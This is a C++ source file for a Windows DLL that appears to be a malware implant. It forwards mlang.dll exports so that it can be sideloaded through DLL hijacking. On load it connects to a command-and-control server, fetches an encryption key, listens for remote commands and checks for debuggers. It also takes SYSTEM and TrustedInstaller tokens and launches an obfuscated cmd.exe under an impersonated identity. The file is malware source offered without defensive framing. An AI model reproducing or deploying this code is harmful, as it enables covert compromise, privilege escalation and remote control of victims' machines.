// dllmain.cpp : Defines the entry point for the DLL application.
#include "ProcessManager.h"
#include "Syscalls.h"
#include "Client.h"
#include "NetworkCommon.h"

#include <thread>

#pragma comment(linker, "/export:IsConvertINetStringAvailable=C:\\Windows\\System32\\mlang.IsConvertINetStringAvailable,@110")
#pragma comment(linker, "/export:ConvertINetString=C:\\Windows\\System32\\mlang.ConvertINetString,@111")
#pragma comment(linker, "/export:ConvertINetUnicodeToMultiByte=C:\\Windows\\System32\\mlang.ConvertINetUnicodeToMultiByte,@112")
#pragma comment(linker, "/export:ConvertINetMultiByteToUnicode=C:\\Windows\\System32\\mlang.ConvertINetMultiByteToUnicode,@113")
#pragma comment(linker, "/export:ConvertINetReset=C:\\Windows\\System32\\mlang.ConvertINetReset,@114")
#pragma comment(linker, "/export:DllCanUnloadNow=C:\\Windows\\System32\\mlang.DllCanUnloadNow,@115")
#pragma comment(linker, "/export:DllGetClassObject=C:\\Windows\\System32\\mlang.DllGetClassObject,@116")
#pragma comment(linker, "/export:GetGlobalFontLinkObject=C:\\Windows\\System32\\mlang.GetGlobalFontLinkObject,@117")
#pragma comment(linker, "/export:LcidToRfc1766A=C:\\Windows\\System32\\mlang.LcidToRfc1766A,@120")
#pragma comment(linker, "/export:LcidToRfc1766W=C:\\Windows\\System32\\mlang.LcidToRfc1766W,@121")
#pragma comment(linker, "/export:Rfc1766ToLcidA=C:\\Windows\\System32\\mlang.Rfc1766ToLcidA,@122")
#pragma comment(linker, "/export:Rfc1766ToLcidW=C:\\Windows\\System32\\mlang.Rfc1766ToLcidW,@123")

//#pragma section(".didat",execute, read, write)
#pragma comment(linker, "/SECTION:.didat,ERW")

#pragma data_seg(".didat")
int _x = 0;
#pragma data_seg()


BOOL APIENTRY DllMain(HMODULE hModule,
					  DWORD  ul_reason_for_call,
					  LPVOID lpReserved
)
{
	switch ( ul_reason_for_call )
	{
	case DLL_PROCESS_ATTACH:		
		std::unique_ptr<Client> me = std::make_unique<Client>();

		// try to connect to c2 server
		if ( !me->Connect() )
			me->~Client();

		OutputDebugStringA("connected");

		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
		me->MakeTCPRequest(req, TRUE);
		OutputDebugStringA("good");
		me->ListenForServerCommands();

		ProcessManager mgr;
		mgr.CheckNoDebugger();

		HANDLE escalatedPriv = mgr.GetSystemToken();
		std::string strCmd   = std::string(HIDE("C:\\Windows\\System32\\cmd.exe /K whoami"));
		std::wstring wstrCmd = std::wstring(strCmd.begin(), strCmd.end());
		 
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi;
		
		HANDLE token = mgr.GetTrustedInstallerToken();

		mgr.OpenProcessAsImposter(
			token,
			LOGON_WITH_PROFILE,
			NULL,
			wstrCmd.data(),
			CREATE_NEW_CONSOLE,
			NULL,
			NULL,
			&si,
			&pi
		);


		while ( 1 ) {
			Sleep(1000);
		}

		break;
	}
	return TRUE;
}

